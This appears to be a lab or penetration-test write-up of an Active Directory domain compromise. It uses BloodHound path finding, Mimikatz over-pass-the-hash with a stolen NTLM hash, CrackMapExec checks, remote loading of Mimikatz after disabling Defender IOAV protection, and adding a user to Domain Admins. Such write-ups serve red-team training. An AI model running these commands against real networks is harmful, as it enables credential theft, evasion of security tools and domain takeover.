##Steps to Compromise
Looking at the BloodHound database, we query for shortest path to domain admin, and we can see that 
the serviceacct user is an admin to GARRISON-DC

We successfully got the hash of serviceacct from PRODSRV, using over pass the hash method we can get 
a powershell prompt in the context of this user. We can verify this user is an admin to GARRISON-DC by 
running these commands:
First Over pass the hash:
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:serviceacct 
/domain:[domain] /ntlm:[hash] 
/run:powershell.exe"'
```
Then execute whomai;hostname on domain
```
Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName [computername]
```
We can successfully run commands on GARRISON-DC.
We can also verify this by running CrackMapExec with the hash of serviceacct.
```
crackmapexec -u [user] -H [hash] -d [domain] [ip] --shares
```
Using PSRemoting, we can Invoke-Mimikatz by loading a locally loaded function:
```
$sess = New-PSSession -ComputerName [computername]
Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection 
$true} -Session $sess
Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess
```
We can also now add examad user to the Domain Admins group.
```
net group "Domain Admins" ad /add /domain
```
